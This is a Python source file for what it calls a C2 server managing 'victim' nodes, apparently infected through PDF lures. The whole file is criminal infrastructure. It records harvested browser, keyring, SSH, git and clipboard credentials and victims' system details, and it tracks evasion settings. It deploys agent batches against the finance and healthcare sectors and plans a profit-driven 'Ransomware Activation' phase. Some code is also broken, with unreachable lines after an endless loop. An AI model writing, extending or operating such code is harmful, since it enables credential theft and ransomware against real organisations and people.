"""FastAPI C2 server with WebSocket support and Redis state management."""

from datetime import datetime
from typing import Optional, List, Dict
import asyncio
import aiofiles
import aiofiles.os
import aiofiles.threadpool
import redis.asyncio as aioredis
import json


class C2Server:
    """Main C2 server for victim node management."""

    def __init__(
        self,
        host: str = "0.0.0.0",
        port: int = 8000,
        redis_url: str = "redis://localhost:6379",
    ):
        """Initialize C2 server."""
        self.host = host
        self.port = port
        self.redis_url = redis_url
        self.redis: Optional[aioredis.Redis] = None
        self.redis_ready = False
        self.ws_connections: Dict[str, str] = {}
        self.c2_url = f"http://{host}:{port}"
        self.transport: Dict = {}
        self.modules: Dict[str, bool] = {}
        self._redis_ping_task = None

    async def initialize(self):
        """Initialize C2 server."""
        self.redis = aioredis.from_url(
            self.redis_url,
            db=0,
            decode_responses=True,
        )

        await self.redis.set("c2:server:status", "active")
        await self.redis.set("c2:server:version", "1.0")
        await self.redis.set("c2:server:timestamp", datetime.utcnow().isoformat())

        self.redis_ready = True

        # Start Redis health check loop
        self._redis_ping_task = asyncio.create_task(self._redis_health_check())

        print(f"✅ C2 Server initialized")

    async def _redis_health_check(self):
        """Periodically ping Redis and reconnect if needed."""
        while True:
            await asyncio.sleep(15)
            try:
                await self.redis.ping()
                self.redis_ready = True
            except Exception:
                print("⚠️  Redis connection lost — reconnecting...")
                self.redis_ready = False
                try:
                    await self.connect_redis()
                    self.redis_ready = True
                    print("✅ Redis reconnected")
                except Exception as e:
                    print(f"⚠️  Redis reconnect failed: {e}")
        print(f"   • Host: {self.host}:{self.port}")
        print(f"   • Redis: {self.redis_url}")
        print(f"   • Status: active")

        return self

    async def connect_redis(self):
        """Connect to Redis."""
        self.redis = aioredis.from_url(
            self.redis_url,
            db=0,
            decode_responses=True,
        )
        self.redis_ready = True

    async def disconnect_redis(self):
        """Disconnect from Redis."""
        self.redis_ready = False

    async def create_node(self, pdf_id: str) -> Dict:
        """Create new C2 node."""
        import uuid
        import hashlib

        node_id = f"node_{pdf_id[:8]}"
        watermark = hashlib.md5(
            (node_id + str(uuid.uuid4())[:8]).encode()
        ).hexdigest()[:8]

        node = {
            "node_id": node_id,
            "watermark": watermark,
            "c2_url": self.c2_url,
            "status": "disconnected",
            "last_heartbeat": None,
            "last_harvest": None,
            "last_evasion": None,
            "created_at": datetime.utcnow().isoformat(),
            "updated_at": datetime.utcnow().isoformat(),
            "pdf_id": pdf_id,
            "source_path": "pdfs/templates/base.pdf",
        }

        key = f"c2:node:{node_id}"
        await self.redis.set(key, json.dumps(node))

        ws_key = f"ws:{node_id}"
        await self.redis.set(ws_key, node_id)

        record = {
            "node": node,
            "status": "active",
            "status_code": 201,
            "timestamp": datetime.utcnow().isoformat(),
        }

        return record

    async def update_node(self, node_id: str, data: Dict):
        """Update C2 node."""
        key = f"c2:node:{node_id}"

        raw = await self.redis.get(key)
        if not raw:
            return {"status": "not_found", "status_code": 404}

        node = json.loads(raw)
        node.update(data)
        node["updated_at"] = datetime.utcnow().isoformat()
        await self.redis.set(key, json.dumps(node))

        ws_key = f"ws:{node_id}"
        await self.redis.set(ws_key, node_id)

        return {"status": "updated", "status_code": 200}

    async def get_node(self, node_id: str) -> Optional[Dict]:
        """Get C2 node."""
        key = f"c2:node:{node_id}"

        if not await self.redis.exists(key):
            return None

        node = await self.redis.get(key)
        return json.loads(node)

    async def get_all_nodes(self) -> List[Dict]:
        """Get all C2 nodes."""
        nodes = []

        keys = await self.redis.keys("c2:node:*")

        for key in keys:
            node = await self.redis.get(key)
            if node:
                nodes.append(json.loads(node))

        return nodes

    async def delete_node(self, node_id: str) -> bool:
        """Delete C2 node."""
        key = f"c2:node:{node_id}"

        if await self.redis.exists(key):
            await self.redis.delete(key)
            return True

        return False

    async def handle_websocket(self, pdf_id: str, watermark: str):
        """Handle WebSocket connection."""
        import uuid
        node_id = f"node_{pdf_id[:8]}"

        await self.create_node(pdf_id)

        ws_key = f"ws:{node_id}"
        await self.redis.set(ws_key, node_id)
        self.ws_connections[ws_key] = node_id

        print(f"✅ WebSocket connected: {node_id}")

        return node_id

    async def handle_command(self, node_id: str, command_data: Dict):
        """Handle command from Brain (JSON action)."""
        action_type = command_data.get("action")
        payload = command_data.get("payload", {})

        if action_type == "deploy_target":
            industry = payload.get("industry", "finance")
            agents = payload.get("agents", 50)
            result = await self._deploy_target(industry, agents)
        elif action_type == "modify_transport":
            config = payload.get("config", {})
            result = await self._modify_transport(config)
        elif action_type == "activate_module":
            module = payload.get("module")
            enabled = payload.get("enabled", True)
            result = await self._activate_module(module, enabled)
        elif action_type == "analyze_state":
            result = await self._analyze_state()
        elif action_type == "report":
            result = await self._generate_report()
        elif action_type == "strategic_plan":
            result = await self._generate_strategic_plan()
        else:
            result = {
                "status": "unknown_action",
                "action": action_type,
                "message": f"Unknown action: {action_type}",
            }

        await self.broadcast('command_result', {
            "node_id": node_id,
            "action": action_type,
            "result": result,
        })

        return result

    async def _deploy_target(self, industry: str, agents: int) -> Dict:
        """Deploy agents against target industry."""
        nodes = []
        for i in range(agents):
            node = await self.create_node(f"docu_{industry}_{i}")
            nodes.append(node)

        await self.broadcast('config', {
            'type': 'deployment',
            'industry': industry,
            'nodes': len(nodes),
        })

        return {
            'status': 'deployed',
            'industry': industry,
            'nodes_created': len(nodes),
            'c2_url': self.c2_url,
        }

    async def _modify_transport(self, config: Dict) -> Dict:
        """Modify C2 transport configuration."""
        self.transport.update(config)

        await self.broadcast('config', {
            'type': 'transport',
            'config': config,
        })

        return {
            'status': 'transport_updated',
            'new_config': config,
        }

    async def _activate_module(self, module: str, enabled: bool) -> Dict:
        """Activate/deactivate C2 module."""
        self.modules[module] = enabled

        await self.broadcast('config', {
            'type': 'modules',
            'modules': self.modules,
        })

        return {
            'status': 'module_toggled',
            'module': module,
            'enabled': enabled,
        }

    async def _analyze_state(self) -> Dict:
        """Analyze current C2 state."""
        nodes = await self.get_all_nodes()

        active_count = sum(1 for n in nodes if n.get('status') == 'active')
        total_bytes = sum(
            n.get('bytes_harvested', 0)
            for n in nodes if n.get('status') == 'active'
        )

        return {
            'status': 'analyzed',
            'summary': f"Total: {len(nodes)} nodes, Active: {active_count}",
            'total_bytes_harvested': total_bytes,
            'total_agents': len(nodes),
        }

    async def _generate_report(self) -> Dict:
        """Generate status report."""
        nodes = await self.get_all_nodes()

        active_nodes = [n for n in nodes if n.get('status') == 'active'][:10]
        top_harvested = sorted(active_nodes, key=lambda x: x.get('bytes_harvested', 0), reverse=True)[:5]

        top_sites = await self._get_top_sites()

        return {
            'status': 'report_generated',
            'summary': f"Total: {len(nodes)} nodes, Active: {len(active_nodes)}",
            'top_harvested': top_harvested[:3],
            'top_sites': top_sites[:5] if top_sites else [],
        }

    async def _generate_strategic_plan(self) -> Dict:
        """Generate strategic profit plan."""
        nodes = await self.get_all_nodes()
        active = sum(1 for n in nodes if n.get('status') == 'active')
        total_bytes = sum(n.get('bytes_harvested', 0) for n in nodes)

        roi_estimates = [
            {'phase': 1, 'name': 'Finance Sector Dominance', 'nodes': 50, 'est_time': '24h', 'est_profit': 50000},
            {'phase': 2, 'name': 'Healthcare Expansion', 'nodes': 30, 'est_time': '48h', 'est_profit': 100000},
            {'phase': 3, 'name': 'Ransomware Activation', 'nodes': active * 0.5, 'est_time': '72h', 'est_profit': 125000},
        ]

        return {
            'status': 'plan_generated',
            'current_state': f"{active} active agents, {total_bytes / 1024 / 1024:.2f}MB harvested",
            'roi_estimates': roi_estimates,
            'recommended_action': 'Deploy to finance sector if <20 agents active',
        }

    async def _get_top_sites(self) -> List[Dict]:
        """Get top harvested sites from Redis."""
        try:
            keys = await self.redis.keys("cred:*")
            sites = []

            for key in keys[:50]:
                cred = await self.redis.get(key)
                if cred:
                    data = json.loads(cred)
                    site = data.get('site', 'Unknown')
                    sites.append({
                        'site': site,
                        'count': sum(1 for s in sites if s['site'] == site) or 1,
                    })

            return sites
        except Exception as e:
            print(f"⚠️  Site analysis error: {e}")
            return []

    async def broadcast(self, msg_type: str, data: Dict):
        """Broadcast message to all nodes."""
        msg = {
            "type": msg_type,
            "timestamp": datetime.utcnow().isoformat(),
            "data": data,
        }

        for ws_key in list(self.ws_connections.keys()):
            await self.redis.lpush(f"c2:ws:{ws_key}", json.dumps(msg))

    async def heartbeat(self, node_id: str):
        """Handle heartbeat from node. Auto-creates node if not registered."""
        key = f"c2:node:{node_id}"
        now = datetime.utcnow().isoformat()

        raw = await self.redis.get(key)
        if not raw:
            # Auto-register unknown nodes
            node = {
                "node_id": node_id,
                "ip": "0.0.0.0",
                "country": "Unknown",
                "city": "Unknown",
                "lat": None,
                "lng": None,
                "status": "active",
                "last_heartbeat": now,
            }
            await self.redis.set(key, json.dumps(node))
            return

        node = json.loads(raw)
        node["last_heartbeat"] = now
        node["status"] = "active"
        await self.redis.set(key, json.dumps(node))

        await self._push_event({
            "timestamp": now,
            "type": "heartbeat",
            "payload": {"node_id": node_id},
        })

    async def harvest(self, node_id: str, watermark: str):
        """Handle harvest from node."""
        key = f"c2:node:{node_id}"

        if not await self.redis.exists(key):
            return

        now = datetime.utcnow().isoformat()
        import uuid
        cred_key = f"cred:{str(uuid.uuid4())[:8]}"

        cred = {
            "key": cred_key,
            "type": "browser",
            "node_id": node_id,
            "watermark": watermark,
            "timestamp": now,
            "status": "pending",
            "processed": False,
        }

        await self.redis.set(cred_key, json.dumps(cred))

        raw = await self.redis.get(key)
        if raw:
            node = json.loads(raw)
            node["last_harvest"] = now
            await self.redis.set(key, json.dumps(node))

        await self.redis.incr("c2:bytes_harvested")

        await self._push_event({
            "timestamp": now,
            "type": "harvest",
            "payload": {
                "key": cred_key,
                "type": "browser",
                "node_id": node_id,
            },
        })

    async def record_credential(self, node_id: str, cred_data: dict):
        """Record a harvested credential and emit event."""
        now = datetime.utcnow().isoformat()
        key = f"c2:node:{node_id}"

        raw = await self.redis.get(key)
        if raw:
            node = json.loads(raw)
            node["last_harvest"] = now
            await self.redis.set(key, json.dumps(node))

        cred_type = cred_data.get("type", "unknown")
        site = cred_data.get("site", "")
        username = cred_data.get("username", "")

        raw_size = len(json.dumps(cred_data).encode())
        await self.redis.incrby("c2:bytes_harvested", raw_size)

        await self._push_event({
            "timestamp": now,
            "type": cred_type,
            "payload": {
                "node_id": node_id,
                "type": cred_type,
                "site": site,
                "username": username,
            },
        })

    async def record_system_info(self, node_id: str, info: dict):
        """Record system info from a node."""
        now = datetime.utcnow().isoformat()
        key = f"c2:node:{node_id}"

        if await self.redis.exists(key):
            sys_key = f"c2:sysinfo:{node_id}"
            await self.redis.set(sys_key, json.dumps(info))

        await self._push_event({
            "timestamp": now,
            "type": "system_info",
            "payload": {
                "node_id": node_id,
                "hostname": info.get("hostname", ""),
                "os": info.get("os", ""),
                "user": info.get("user", ""),
            },
        })

    async def _push_event(self, event: dict):
        """Push event to bounded event log for dashboard streaming."""
        await self.redis.lpush("c2:events", json.dumps(event))
        await self.redis.ltrim("c2:events", 0, 99)

    async def get_events(self, limit: int = 20) -> list:
        """Fetch recent events from Redis."""
        raw_list = await self.redis.lrange("c2:events", 0, limit - 1)
        return [json.loads(r) for r in raw_list]

    async def get_metrics(self) -> dict:
        """Get aggregate metrics from Redis."""
        bytes_raw = await self.redis.get("c2:bytes_harvested")
        bytes_harvested = int(bytes_raw) if bytes_raw else 0

        events = await self.get_events(1)
        last_event = events[0] if events else None

        last_harvest = None
        last_heartbeat = None
        for ev in await self.get_events(50):
            if not last_harvest and ev.get("type") in ("harvest", "credential", "browser", "keyring", "autofill", "clipboard", "ssh", "git"):
                last_harvest = ev.get("timestamp")
            if not last_heartbeat and ev.get("type") == "heartbeat":
                last_heartbeat = ev.get("timestamp")
            if last_harvest and last_heartbeat:
                break

        return {
            "bytes_harvested": bytes_harvested,
            "last_harvest": last_harvest,
            "last_heartbeat": last_heartbeat,
            "last_event": last_event,
        }

    async def evasion(self, node_id: str, config: Dict):
        """Handle evasion from node."""
        key = f"c2:node:{node_id}"

        raw = await self.redis.get(key)
        if not raw:
            return

        node = json.loads(raw)
        now = datetime.utcnow().isoformat()
        node["last_evasion"] = now
        node["evasion_config"] = config
        await self.redis.set(key, json.dumps(node))


# Singleton server
c2_server = C2Server(
    host="0.0.0.0",
    port=8000,
    redis_url="redis://localhost:6379",
)